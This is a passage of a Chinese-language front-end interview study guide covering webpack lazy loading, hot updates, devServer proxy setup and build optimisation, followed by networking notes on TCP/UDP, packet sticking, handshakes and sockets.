</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p><strong>import()方法是由es6提出的，动态加载返回一个Promise对象，then方法的参数是加载到的模块。类似于Node.js的require方法，主要import()方法是异步加载的。</strong></p> <p>然后通过Webpack编译打包后，<strong>会把每个路由组件的代码分割成一一个js文件，初始化时不会加载这些js文件，只当激活路由组件才会去加载对应的js文件</strong>。</p> <p>先用link定义Home.js、app.js、chunk-vendors.js这些资源和web客户端的关系。</p> <ul><li><code>ref=preload</code>：告诉浏览器这个资源要给我<strong>提前加载</strong>。</li> <li><code>rel=prefetch</code>：告诉浏览器这个<strong>资源空闲的时候给我加载一下</strong>。</li> <li><code>as=script</code>：告诉浏览器这个资源是script，提升加载的优先级。</li></ul> <p>然后在body里面加载了chunk-vendors.js、app.js这两个js资源。可以看出web客户端初始化时候就加载了这个两个js资源。</p> <p><strong>核心：懒加载（按需加载）原理分为两步：</strong></p> <ol><li>将需要进行懒加载的子模块打包成独立的文件（<code>children chunk</code>）；</li> <li>借助函数来实现延迟执行子模块的加载代码；</li></ol> <h3 id="_6-热更新原理"><a href="#_6-热更新原理" class="header-anchor">#</a> 6:热更新原理</h3> <p>HMR的核心就是**客户端从服务端拉去更新后的文件，准确的说是 chunk diff (chunk 需要更新的部分)，实际上 WDS 与浏览器之间维护了一个 <code>Websocket</code>，**当本地资源发生变化时，WDS 会向浏览器推送更新，并带上构建时的 hash，让客户端与上一次资源进行对比。客户端对比出差异后会向 WDS 发起 <code>Ajax</code> 请求来获取更改内容(文件列表、hash)，这样客户端就可以再借助这些信息继续向 WDS 发起 <code>jsonp</code> 请求获取该chunk的增量更新。</p> <ol><li>Webpack编译期，为需要热更新的 entry <strong>注入热更新代码(EventSource通信)</strong>;</li> <li>页面首次打开后，<strong>服务端与客户端通过 EventSource 建立通信渠道</strong>，把下一次的 hash 返回前端;</li> <li><strong>客户端获取到hash</strong>，这个hash将作为下一次请求服务端 <code>hot-update.js</code> 和 <code>hot-update.json</code>的hash;</li> <li>修改页面代码后，Webpack <strong>监听到文件修改后</strong>，开始编译，编译完成后，<strong>发送 build 消息给客户端;</strong></li> <li>客户端获取到hash，<strong>成功后客户端构造hot-update.js script链接，然后插入主文档</strong>;</li> <li>hot-update.js 插入成功后，<strong>执行hotAPI 的 createRecord 和 reload方法</strong>，获取到 Vue 组件的 render方法，<strong>重新 render 组件， 继而实现 UI 无刷新更新</strong>;</li></ol> <h3 id="_7-tree-shaking及压缩"><a href="#_7-tree-shaking及压缩" class="header-anchor">#</a> 7:tree-shaking及压缩</h3> <h4 id="配置及原理"><a href="#配置及原理" class="header-anchor">#</a> 配置及原理</h4> <ol><li>ES6的模块引入是静态分析的，故而可以在编译时正确判断到底加载了什么代码。</li> <li>分析程序流，判断哪些变量未被使用、引用，进而删除此代码。</li></ol> <h3 id="_8-devserver设置"><a href="#_8-devserver设置" class="header-anchor">#</a> 8:devServer设置</h3> <p>服务于webpack-dev-server  <strong>内部封装了一个express</strong>；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>devServer<span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">//服务于webpack-dev-server  内部封装了一个express </span>
    port<span class="token operator">:</span> <span class="token string">'8080'</span><span class="token punctuation">,</span>
    <span class="token function">before</span><span class="token punctuation">(</span><span class="token parameter">app</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/test.json'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                code<span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>
                message<span class="token operator">:</span> <span class="token string">'Hello World'</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="跨域代理设置"><a href="#跨域代理设置" class="header-anchor">#</a> 跨域代理设置</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code>devServer<span class="token operator">:</span> <span class="token punctuation">{</span>
    port<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_PORT</span><span class="token punctuation">,</span>
    proxy<span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token punctuation">[</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_API_PREFIX</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        target<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_API_TARGET_URL</span><span class="token punctuation">,</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        ws<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="自定义实现-4"><a href="#自定义实现-4" class="header-anchor">#</a> 自定义实现</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> createProxyMiddleware <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> proxyApi<span class="token punctuation">,</span> targetApi <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./app/conf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

exports<span class="token punctuation">.</span><span class="token function-variable function">startServer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">port<span class="token punctuation">,</span> path<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>proxyApi<span class="token punctuation">,</span> <span class="token function">createProxyMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">{</span> target<span class="token operator">:</span> targetApi<span class="token punctuation">,</span> changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> ws<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">app listening on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="_9-vue-config-js特殊"><a href="#_9-vue-config-js特殊" class="header-anchor">#</a> 9:vue.config.js特殊</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>  <span class="token function-variable function">chainWebpack</span><span class="token operator">:</span> <span class="token parameter">config</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    config<span class="token punctuation">.</span>resolve<span class="token punctuation">.</span>alias<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'@$'</span><span class="token punctuation">,</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">// config.resolve.alias.set('vue$', 'vue/dist/vue.esm.js')</span>
    config<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'named-chunks'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="_10-构建优化"><a href="#_10-构建优化" class="header-anchor">#</a> 10:构建优化</h3> <h4 id="开发环境"><a href="#开发环境" class="header-anchor">#</a> 开发环境</h4> <ul><li>HRM (热替换)</li> <li>webpack-dev-server （本地服务器）</li> <li>soure-map （调试）</li> <li>webpack-bundle-analyzer（打包生成代码块分析视图）</li> <li>size-plugin（监控打包资源的体积变量化）</li> <li>speed-measure-webpack-plugin（分析loader和plugin打包的耗时）</li></ul> <h4 id="生产环境"><a href="#生产环境" class="header-anchor">#</a> 生产环境</h4> <h5 id="体积优化【要点】"><a href="#体积优化【要点】" class="header-anchor">#</a> <strong>体积优化</strong>【要点】</h5> <ul><li>html压缩 （html-webpack-plugin ）</li> <li>js压缩 （production模式自动开启）</li> <li>css压缩 （optimize-css-assets-webpack-plugin）</li> <li>css提取（mini-css-extract-plugin）</li> <li>externals （排除不需要被打包的第三方）</li> <li>tree-shake ( production模式自动开启(<strong>webpack4限EsModule;webpack5不限EsModule,CommonJs,优秀得很</strong>) )</li> <li><strong>import(懒加载，预加载（预加载慎用））</strong></li> <li>code-split ( optimization )</li></ul> <h5 id="打包速度优化"><a href="#打包速度优化" class="header-anchor">#</a> <strong>打包速度优化</strong></h5> <ul><li>exclude / exclude (排除一些不需要编译的文件)</li> <li>module.noParse (排除不需要被loader编译的第三方库)</li> <li>babel缓存（ 缓存cacheDirectory ）</li> <li>多线程打包（thread-loader 、happyPack）</li> <li>externals 处理；</li> <li>动态链 （ DLL ）</li></ul> <h2 id="nodejs-10题"><a href="#nodejs-10题" class="header-anchor">#</a> nodejs[10题]</h2> <h3 id="队列"><a href="#队列" class="header-anchor">#</a> 队列</h3> <h3 id="常用方法-2"><a href="#常用方法-2" class="header-anchor">#</a> 常用方法</h3> <h3 id="脚手架实现"><a href="#脚手架实现" class="header-anchor">#</a> 脚手架实现</h3> <h2 id="koajs-10题"><a href="#koajs-10题" class="header-anchor">#</a> koajs[10题]</h2> <h3 id="compose原理"><a href="#compose原理" class="header-anchor">#</a> compose原理</h3> <h2 id="eggjs-10题"><a href="#eggjs-10题" class="header-anchor">#</a> eggjs[10题]</h2> <h3 id="使用结构及步骤"><a href="#使用结构及步骤" class="header-anchor">#</a> 使用结构及步骤</h3> <h1 id="网络部分"><a href="#网络部分" class="header-anchor">#</a> 网络部分</h1> <h2 id="体系结构"><a href="#体系结构" class="header-anchor">#</a> 体系结构</h2> <h3 id="各层比较"><a href="#各层比较" class="header-anchor">#</a> 各层比较</h3> <ul><li>网络<strong>七层模型</strong>是<strong>一个标准，而非实现</strong>。</li> <li>网络四层模型是一个<strong>实现的应用模型</strong>。网络四层模型由七层模型简化合并而来。</li></ul> <p><img src="/rat-summ/assets/img/17-51-36.b1299a0e.jpg" alt=""></p> <p>OSI/TCP/IP的体系结构详细介绍 ==&gt;<strong>应传网数</strong></p> <p><img src="/rat-summ/assets/img/18-03-50.08a51186.jpg" alt=""></p> <h3 id="tcp-ip各层比较"><a href="#tcp-ip各层比较" class="header-anchor">#</a> TCP/IP各层比较 <img src="/rat-summ/assets/img/18-05-16.c7c4ce00.jpg" alt="img"></h3> <p><strong>路由器与交换机的区别</strong></p> <p><img src="/rat-summ/assets/img/10-30-02.dcfa22c5.jpg" alt="img"></p> <h3 id="tcp-ip通信过程"><a href="#tcp-ip通信过程" class="header-anchor">#</a> TCP/IP通信过程</h3> <p><img src="/rat-summ/assets/img/18-06-02.aedb8604.jpg" alt=""></p> <h2 id="tcp-udp-10题"><a href="#tcp-udp-10题" class="header-anchor">#</a> TCP/UDP[10题]</h2> <h3 id="协议简介"><a href="#协议简介" class="header-anchor">#</a> 协议简介</h3> <p><code>Transmission Control Protocol</code>，<strong>TCP</strong>即 传输控制协议</p> <blockquote><ol><li>属于 传输层通信协议</li> <li>基于<code>TCP</code>的应用层协议有<code>HTTP</code>、<code>SMTP</code>、<code>FTP</code>、<code>Telnet</code> 和 <code>POP3</code></li></ol></blockquote> <p>关于<code>TCP</code>的其他知识：如三次握手、四次挥手、无差错控制原理等</p> <p><code>User Datagram Protocol</code>，<strong>UDP</strong>即 用户数据报协议</p> <blockquote><ol><li>属于 传输层通信协议</li> <li>基于<code>UDP</code>的应用层协议有 <code>TFTP</code>、<code>SNMP</code> 与 <code>DNS</code></li></ol></blockquote> <h3 id="tcp报文段格式"><a href="#tcp报文段格式" class="header-anchor">#</a> TCP报文段格式</h3> <ul><li><strong>TCP虽面向字节流，但传送的数据单元 = 报文段</strong></li> <li>报文段 = 首部 + 数据 2部分</li> <li>TCP的全部功能体现在它首部中各字段的作用，故下面主要讲解TCP报文段的首部</li></ul> <blockquote><ol><li>首部前20个字符固定、后面有4n个字节是根据需而增加的选项</li> <li>故 TCP首部最小长度 = 20字节</li></ol></blockquote> <p><img src="/rat-summ/assets/img/image-20211101162738820.312df718.png" alt="image-20211101162738820"></p> <h3 id="udp报文段格式"><a href="#udp报文段格式" class="header-anchor">#</a> UDP报文段格式</h3> <ul><li>UDP的报文段共有2个字段：数据字段 &amp; 首部字段</li> <li>下面主要介绍首部（8字节、4个字段）</li></ul> <p><img src="/rat-summ/assets/img/image-20211101162831826.536b87ba.png" alt="image-20211101162831826"></p> <h3 id="tcp-udp的区别【要点】"><a href="#tcp-udp的区别【要点】" class="header-anchor">#</a> TCP/UDP的区别【要点】</h3> <p><img src="/rat-summ/assets/img/18-26-51.efc97835.jpg" alt="img"></p> <p>TCP有粘包的情况；</p> <table><thead><tr><th>协议</th> <th>连接性</th> <th>双工性</th> <th>可靠性</th> <th>有序性</th> <th>有界性</th> <th>拥塞控制</th> <th>传输速度</th> <th>量级</th> <th>头部大小</th></tr></thead> <tbody><tr><td>TCP</td> <td>面向连接(Connection oriented)</td> <td>全双(1:1)</td> <td><strong>可靠(重传机制)</strong></td> <td>有序(通过SYN排序)</td> <td>无, 有粘包情况</td> <td>有</td> <td>慢</td> <td>低</td> <td><strong>20~60字节</strong>TCP粘包/拆包</td></tr> <tr><td>UDP</td> <td>无连接(Connection less)</td> <td>n:m</td> <td>不可靠(丢包后数据丢失)</td> <td>无序</td> <td>有消息边界, <strong>无粘包</strong></td> <td>无</td> <td>快</td> <td>高</td> <td><strong>8字节</strong></td></tr></tbody></table> <h3 id="tcp-websocket粘包-拆包"><a href="#tcp-websocket粘包-拆包" class="header-anchor">#</a> TCP/websocket粘包/拆包</h3> <h4 id="简介"><a href="#简介" class="header-anchor">#</a> 简介</h4> <p>TCP是一个基于字节流的传输服务，<strong>&quot;流&quot;意味着TCP所传输的数据是没有边界的</strong>。这不同于UDP提供<strong>基于消息的传输服务，其传输的数据是有边界的</strong>。TCP的<strong>发送方无法保证对等方每次接收到的是一个完整的数据包</strong>。tcp再传输数据时，发送消息并非一包一包发送，存在粘包、拆包的情况；</p> <p>websocket 底层使用的tcp 协议。当一次发送<strong>数据过长时，tcp 会把数据封成多个包发送</strong>；同样当<strong>数据过短时， 会把数据合并成一个包发送</strong>，这种现象就是粘包。</p> <p><strong>默认情况下, TCP 连接会启用<code>延迟传送算法</code> (Nagle 算法),</strong> 在数据发送之前缓存他们. 如果短时间有多个数据发送, 会缓冲到一起作一次发送 (缓冲大小见 <code>socket.bufferSize</code>), <strong>这样可以减少 IO 消耗提高性能</strong>.如果是传输文件的话, 那么根本不用处理粘包的问题, 来一个包拼一个包就好了.  <strong>但是如果是多条消息, 或者是别的用途的数据那么久需要处理粘包.</strong></p> <p>可以参见网上流传比较广的一个例子:</p> <p>连续调用两次 send 分别发送两段数据 data1 和 data2, 在接收端有以下几种常见的情况:</p> <ul><li>A. 先接收到 data1, 然后接收到 data2 .</li> <li>B. 先接收到 data1 的部分数据, 然后接收到 data1 余下的部分以及 data2 的全部.</li> <li>C. 先接收到了 data1 的全部数据和 data2 的部分数据, 然后接收到了 data2 的余下的数据.</li> <li>D. 一次性接收到了 data1 和 data2 的全部数据.</li></ul> <p><strong>其中的 BCD 就是我们常见的粘包的情况</strong>. 而对于处理粘包的问题, <strong>常见的解决方案有</strong>:</p> <ul><li><strong>多次发送之前间隔一个等待时间</strong>；</li> <li>关闭 Nagle 算法；</li> <li>进行封包/拆包；<strong>封包/拆包是目前业内常见的解决方案了</strong>. 即<code>给每个数据包在发送之前, **于其前/后放一些有特征的数据, 然后收到数据的时候根据特征数据分割出来各个数据包</code>.**</li></ul> <h4 id="解决方案"><a href="#解决方案" class="header-anchor">#</a> <strong>解决方案</strong></h4> <ul><li><p><em>方案1</em></p> <p>只需要等上一段时间再进行下一次 send 就好, 适用于交互频率特别低的场景. 缺点也很明显, 对于比较频繁的场景而言传输效率实在太低. 不过几乎用做什么处理.</p></li> <li><p><em>方案2</em></p> <p>关闭 Nagle 算法, 在 Node.js 中你可以通过 <a href="https://nodejs.org/dist/latest-v6.x/docs/api/net.html#net_socket_setnodelay_nodelay" target="_blank" rel="noopener noreferrer">`socket.setNoDelay()<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 方法来关闭 Nagle 算法, 让每一次 send 都不缓冲直接发送.</p> <p>该方法比较适用于<strong>每次发送的数据都比较大</strong> (但不是文件那么大), 并且频率不是特别高的场景. 如果是每次发送的数据量比较小, 并且频率特别高的, 关闭 Nagle 纯属自废武功.</p> <p><strong>另外, 该方法不适用于网络较差的情况</strong>, 因为 Nagle 算法是在服务端进行的包合并情况, 但是如果短时间内客户端的网络情况不好, 或者应用层由于某些原因不能及时将 TCP 的数据 recv, <strong>就会造成多个包在客户端缓冲从而粘包的情况</strong>. (如果是在稳定的机房内部通信那么这个概率是比较小可以选择忽略的)</p></li> <li><p><em>方案3</em></p> <p><strong>封包/拆包是目前业内常见的解决方案了</strong>. 即给每个数据包在发送之前, 于其前/后放一些有特征的数据, 然后收到数据的时候根据特征数据分割出来各个数据包.</p> <ul><li>1、<strong>发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度;</strong></li> <li>2、<strong>发送端将每个数据包封装为固定长度（不够的可以通过补0填充）</strong>【推荐】</li> <li>3、<strong>可以在数据包之间设置边界，如添加特殊符号</strong></li></ul> <p>示范：</p> <div class="language-tex line-numbers-mode"><pre class="language-tex"><code>//当前发送方发送了两个包，两个包的内容如下：
123456789
ABCDEFGH

//粘包情况
123456789ABCDEFGH
//分包情况
12345
6789
ABCDE
FGH

//处理办法：
//给数据包的头尾加上标记
START123456789END
STARTABCDEFGHEND
//在数据包头部加上内容的长度
PACKAGELENGTH:0009123456789
PACKAGELENGTH:0008ABCDEFGH
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div></li></ul> <h3 id="tcp三次握手-四次挥手"><a href="#tcp三次握手-四次挥手" class="header-anchor">#</a> TCP三次握手/四次挥手</h3> <h4 id="原理分析-2"><a href="#原理分析-2" class="header-anchor">#</a> 原理分析</h4> <blockquote><h4 id="为什么建立连接协议是三次握手-而关闭连接却是四次挥手呢"><a href="#为什么建立连接协议是三次握手-而关闭连接却是四次挥手呢" class="header-anchor">#</a> 为什么建立连接协议是三次握手，而关闭连接却是四次挥手呢？</h4></blockquote> <p><strong>普通原理</strong>：</p> <ul><li><p>防止服务器端因接收了<strong>早已失效的连接请求报文</strong>，从而一直等待客户端请求，最终导致<strong>形成死锁、浪费资源</strong>；【三次握手】</p></li> <li><p>为了保证通信<strong>双方都能通知对方</strong> 需释放 &amp; 断开连接【四次挥手】</p></li></ul> <p><strong>内部原理</strong>：</p> <p>三次握手：这是因为服务端的LISTEN状态下的SOCKET当收到SYN报文的建连请求后，<strong>它可以把ACK和SYN（ACK起应答作用，而SYN起同步作用）放在一个报文里来发送</strong>。</p> <p>四次挥手：当关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可能未必会马上会关闭SOCKET, 也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报文和FIN报文多数情况下都是分开发送的。</p> <h4 id="三次握手的过程"><a href="#三次握手的过程" class="header-anchor">#</a> 三次握手的过程</h4> <ul><li><strong>客户端发送一个带 SYN=1，Seq=X 的数据包到服务器端口</strong>（第一次握手，由浏览器发起，告诉服务器我要发送请求了）</li> <li><strong>服务器发回一个带 SYN=1， ACK=X+1， Seq=Y 的响应包以示传达确认信息</strong>（第二次握手，由服务器发起，告诉浏览器我准备接受了，你赶紧发送吧）</li> <li><strong>客户端再回传一个带 ACK=Y+1， Seq=Z 的数据包，代表“握手结束”</strong>（第三次握手，由浏览器发送，告诉服务器，我马上就发了，准备接受吧）</li></ul> <h4 id="四次挥手的过程"><a href="#四次挥手的过程" class="header-anchor">#</a> 四次挥手的过程</h4> <ul><li><strong>发起方向被动方发送报文，Fin、Ack、Seq，表示已经没有数据传输了。并进入 FIN_WAIT_1 状态</strong>。(第一次挥手：由浏览器发起的，发送给服务器，<strong>我请求报文发送完了</strong>，你准备关闭吧)</li> <li><strong>被动方发送报文，Ack、Seq，表示同意关闭请求。此时主机发起方进入 FIN_WAIT_2 状态</strong>。(第二次挥手：由服务器发起的，告诉浏览器，<strong>我请求报文接受完了</strong>，我准备关闭了，你也准备吧)</li> <li><strong>被动方向发起方发送报文段，Fin、Ack、Seq，请求关闭连接。并进入 LAST_ACK 状态</strong>。(第三次挥手：由服务器发起，告诉浏览器，<strong>我响应报文发送完了</strong>，你准备关闭吧)</li> <li><strong>发起方向被动方发送报文段，Ack、Seq。然后进入等待 TIME_WAIT 状态。被动方收到发起方的报文段以后关闭连接。发起方等待一定时间未收到回复，则正常关闭</strong>。(第四次挥手：由浏览器发起，告诉服务器，<strong>我响应报文接受完了</strong>，我准备关闭了，你也准备吧)</li></ul> <h4 id="图示"><a href="#图示" class="header-anchor">#</a> 图示</h4> <p><img src="/rat-summ/assets/img/19-50-36.b9c28e80.jpg" alt=""></p> <h4 id="通俗图示"><a href="#通俗图示" class="header-anchor">#</a> 通俗图示</h4> <p><img src="/rat-summ/assets/img/image-20211104195131339.2c54f473.png" alt="image-20211104195131339"></p> <p><img src="/rat-summ/assets/img/11-39-44.e2496df0.jpg" alt=""></p> <blockquote><p><strong>延伸疑问：为什么客户端关闭连接前要等待2MSL时间？</strong></p></blockquote> <ol><li><strong>即 <code>TIME - WAIT</code> 状态的作用是什么；</strong></li> <li><strong><code>MSL</code> = 最长报文段寿命（<code>Maximum Segment Lifetime</code>）</strong></li></ol> <p><strong>原因1：为了保证客户端发送的最后1个连接释放确认报文 能到达服务器，从而使得服务器能正常释放连接</strong>;</p> <p>为了防止最终的 ACK 丢失，发送 ACK 后需要等待一段时间，因为如果丢包服务端需要重新发送 FIN 包，如果客户端已经 closed ，那么服务端会将结果解析成错误。从而在高并发非长连接的场景下会有大量端口被占用。</p> <blockquote><h5 id="为什么tcp释放连接需四次挥手"><a href="#为什么tcp释放连接需四次挥手" class="header-anchor">#</a> 为什么TCP释放连接需四次挥手？</h5></blockquote> <ul><li><p>结论: 为了保证通信<strong>双方都能通知对方</strong> 需释放 &amp; 断开连接</p> <p>**TCP 协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。**TCP 是全双工模式，这就意味着，当 A 向 B 发出 FIN 报文段时，只是表示 A 已经没有数据要发送了，而此时 A 还是能够接受到来自 B 发出的数据；B 向 A 发出 ACK 报文段也只是告诉 A ，它自己知道 A 没有数据要发了，但 B 还是能够向 A 发送数据。</p> <p>所以想要愉快的结束这次对话就需要四次挥手。<strong>即释放连接后，都无法接收 / 发送消息给对方</strong></p></li></ul> <blockquote><h4 id="为什么建立连接协议是三次握手-而关闭连接却是四次挥手呢-2"><a href="#为什么建立连接协议是三次握手-而关闭连接却是四次挥手呢-2" class="header-anchor">#</a> 为什么建立连接协议是三次握手，而关闭连接却是四次挥手呢？</h4></blockquote> <p><strong>普通原理</strong>：</p> <ul><li><p>防止服务器端因接收了<strong>早已失效的连接请求报文</strong>，从而一直等待客户端请求，最终导致<strong>形成死锁、浪费资源</strong>；【三次握手】</p></li> <li><p>为了保证通信<strong>双方都能通知对方</strong> 需释放 &amp; 断开连接【四次挥手】</p></li></ul> <h3 id="socket"><a href="#socket" class="header-anchor">#</a> Socket</h3> <ul><li>即套接字，<strong>是应用层 与 <code>TCP/IP</code> 协议族通信的中间软件抽象层，表现为一个封装了 TCP / IP协议族 的编程接口（API）</strong></li></ul> <blockquote><ol><li><code>Socket</code>不是一种协议，而是一个编程调用接口（<code>API</code>），<strong>属于传输层</strong>（主要<strong>解决数据如何在网络中传输</strong>）</li> <li>即：通过<code>Socket</code>，我们才能在Andorid平台上通过 <code>TCP/IP</code>协议进行开发</li> <li>对用户来说，只需调用Socket去组织数据，以符合指定的协议，即可通信</li></ol></blockquote> <ul><li><p>成对出现，一对套接字：Socket ={(IP地址1:PORT端口号)，(IP地址2:PORT端口号)}</p></li> <li><p>一个 <code>Socket</code> 实例 唯一代表一个主机上的一个应用程序的通信链路
<img src="/rat-summ/assets/img/19-25-40.b8e75f5b.jpg" alt=""></p></li></ul> <h4 id="简介及原理"><a href="#简介及原理" class="header-anchor">#</a> 简介及原理</h4> <p><code>Socket</code>的使用类型主要有两种：</p> <ul><li>流套接字（<code>streamsocket</code>） ：基于 <code>TCP</code>协议，采用 <strong>流的方式</strong> 提供<code>可靠的字节流服务</code></li> <li>数据报套接字(<code>datagramsocket</code>)：基于 <code>UDP</code>协议，采用 <strong>数据报文</strong> 提供<code>数据打包发送的服务</code></li></ul> <p><strong>具体原理图如下</strong>：
